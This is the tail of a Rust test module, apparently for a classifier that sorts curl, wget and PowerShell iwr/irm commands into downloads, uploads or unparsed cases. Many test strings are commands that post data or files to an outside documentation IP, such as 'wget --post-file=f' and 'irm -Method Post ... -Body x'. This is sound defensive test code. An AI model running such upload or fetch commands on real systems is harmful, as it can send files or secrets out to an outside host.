        "iwr -UseBasicParsing https://203.0.113.10/a",
        "iwr -SkipCertificateCheck https://203.0.113.10/a",
        "iwr -DisableKeepAlive -PassThru https://203.0.113.10/a",
        "iwr -SyntheticFutureSwitch https://203.0.113.10/a",
        "iwr -OutFile a https://203.0.113.10/a",
        "iwr -Headers @{Accept='x'} https://203.0.113.10/a",
        "iwr -Headers @{ Accept = 'x' } https://203.0.113.10/a",
        "iwr -Uri https://203.0.113.10/a -TimeoutSec 30 -ErrorAction Stop",
        "Invoke-WebRequest -Uri https://203.0.113.10/a -Method Delete",
        "irm -Method Get -Uri https://203.0.113.10/a -Body q",
        "iwr -Proxy http://203.0.113.20:8080 -Uri http://127.0.0.1/a",
        "iwr -Ur https://203.0.113.10/a",
        "iwr -U https://203.0.113.10/a",
        "iwr -OutFile a -Uri https://203.0.113.10/a > log.txt",
        // `--%` passes the rest unparsed; it is still read, as unread.
        "iwr --% https://203.0.113.10/a",
    ];

    #[test]
    fn powershell_downloads_the_base_reading_matched_still_match() {
        for command in POWERSHELL_DOWNLOADS {
            let tokens = tokens(command);
            assert!(download_candidate(&tokens).is_some(), "{command}");
            assert!(!is_upload(&tokens), "{command}");
        }
        // Loopback only, as before.
        assert!(download_candidate(&tokens("iwr -Uri http://127.0.0.1/a")).is_none());
    }

    #[test]
    fn powershell_parameters_resolve_or_fail_toward_an_upload_or_a_match() {
        // (command, download, upload, unread)
        for (command, download, upload, unread) in [
            // Exact names, attached values and dash variants.
            (
                "irm -Method:Post -Uri:https://203.0.113.10/a",
                false,
                true,
                false,
            ),
            (
                "irm \u{2013}Method Post \u{2013}Uri https://203.0.113.10/a",
                false,
                true,
                false,
            ),
            (
                "Invoke-RestMethod -METHOD post https://203.0.113.10/a",
                false,
                true,
                false,
            ),
            // An abbreviation is read as the parameter it names, unread.
            ("irm -Bo x https://203.0.113.10/a", false, true, true),
            ("irm -Me Post -Ur https://203.0.113.10/a", false, true, true),
            ("iwr -InF f https://203.0.113.10/a", false, true, true),
            // An ambiguous abbreviation of a body parameter, which PowerShell
            // rejects, reads as an upload rather than a download.
            ("iwr -In f https://203.0.113.10/a", false, true, true),
            ("iwr -Fo @{f='x'} https://203.0.113.10/a", false, true, true),
            // Any other unresolved name takes no value: a URL after it is
            // still a target.
            (
                "iwr -SyntheticFutureSwitch https://203.0.113.10/a",
                true,
                false,
                true,
            ),
            ("irm -M Post https://203.0.113.10/a", true, false, true),
            // Splatting and expressions.
            ("iwr @synthetic", false, false, true),
            (
                "irm -Method Post -Uri ('https://203.0.113.10/' + 'a')",
                false,
                true,
                true,
            ),
            // A GET, HEAD or OPTIONS body is a query.
            (
                "irm -Method Get -Body q https://203.0.113.10/a",
                true,
                false,
                false,
            ),
            (
                "irm -Method Head -Body q https://203.0.113.10/a",
                true,
                false,
                false,
            ),
            // These downloaded in the base reading, which read no PowerShell
            // parameter: a body or an upload method makes an upload.
            (
                "irm -Method Post -Uri https://203.0.113.10/a -Body x",
                false,
                true,
                false,
            ),
            ("iwr -InFile f https://203.0.113.10/a", false, true, false),
            (
                "irm https://203.0.113.10/a -Method POST",
                false,
                true,
                false,
            ),
            // So did a lone proxy, which names no target, as `curl -x` alone.
            ("iwr -Proxy http://203.0.113.20:8080", false, false, true),
        ] {
            let tokens = tokens(command);
            let request = request(&tokens[..]);
            assert_eq!(download_candidate(&tokens).is_some(), download, "{command}");
            assert_eq!(is_upload(&tokens), upload, "{command}");
            assert_eq!(request.unread, unread, "{command}");
        }
    }

    #[test]
    fn targets_are_the_words_the_client_requests() {
        for (command, targets, unread) in [
            (
                "curl -d x https://203.0.113.10/a > out.json 2>/dev/null",
                &["https://203.0.113.10/a"][..],
                false,
            ),
            (
                "curl -sS --max-time 5 -d x --url=https://203.0.113.10/a",
                &["https://203.0.113.10/a"],
                false,
            ),
            (
                "curl -d x -- https://203.0.113.10/a 2>&1",
                &["https://203.0.113.10/a"],
                false,
            ),
            (
                "wget -q -O- -T 10 --post-data=x https://203.0.113.10/a",
                &["https://203.0.113.10/a"],
                false,
            ),
            (
                "wget -nv --post-file=f https://203.0.113.10/a",
                &["https://203.0.113.10/a"],
                false,
            ),
            (
                "wget -B https://203.0.113.10/ -i list.txt --post-data=x",
                &["https://203.0.113.10/", "list.txt"],
                true,
            ),
            (
                "irm -Method Post -OutFile o -Uri https://203.0.113.10/a -Body x",
                &["https://203.0.113.10/a"],
                false,
            ),
            (
                "irm -Method Post -Headers @{ Accept = 'x' } https://203.0.113.10/a",
                &["https://203.0.113.10/a"],
                false,
            ),
            (
                "curl --compressed -d x example.invalid/a",
                &["example.invalid/a"],
                false,
            ),
            (
                "curl -W -d x https://203.0.113.10/a",
                &["https://203.0.113.10/a"],
                true,
            ),
        ] {
            let tokens = tokens(command);
            let request = request(&tokens[..]);
            assert_eq!(request.targets, targets, "{command}");
            assert_eq!(request.unread, unread, "{command}");
        }
        // A redirection's target is no request target, though direction still
        // reads it, as the base reading did.
        let tokens = tokens("curl '>' https://203.0.113.10/a");
        assert!(request(&tokens[..]).targets.is_empty());
        assert!(download_candidate(&tokens).is_some());
    }

    #[test]
    fn wget_options_are_read_with_their_values() {
        for command in [
            "wget -O out.html -T 10 https://203.0.113.10/a",
            "wget -qO- https://203.0.113.10/a",
            "wget -B https://203.0.113.10/ -i list.txt",
            "wget -e robots=off https://203.0.113.10/a",
        ] {
            assert!(download_candidate(&tokens(command)).is_some(), "{command}");
        }
    }
}
